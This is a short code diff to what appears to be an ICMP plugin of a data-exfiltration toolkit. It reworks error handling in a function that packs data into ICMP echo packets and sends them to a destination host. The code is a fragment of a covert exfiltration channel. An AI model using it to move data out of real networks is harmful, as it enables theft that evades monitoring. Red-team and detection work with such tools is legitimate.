@@ -11,10 +11,12 @@ app_exfiltrate = None
 def send_icmp(dst, data):
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
-    except Exception:
-        traceback.print_exc()
+    except PermissionError:
         app_exfiltrate.log_message('warning', "ICMP plugin requires root privileges")
         sys.exit()
+    except Exception:
+        traceback.print_exc()
+        return
     ip_dst = socket.gethostbyname(dst)
     echo = icmp.ICMP.Echo()
     echo.id = randint(0, 0xffff)
@@ -25,10 +27,12 @@ def send_icmp(dst, data):
     icmp_pkt.data = echo
     try:
         s.sendto(icmp_pkt.pack(), (ip_dst, 0))
+    except PermissionError:
+        app_exfiltrate.log_message('warning', "ICMP plugin requires root privileges")
+        sys.exit()
     except Exception:
         traceback.print_exc()
-        app_exfiltrate.log_message('warning', "ICMP plugin requires root privileges")
-        pass
+        return
     s.close()
 
 def send(data):
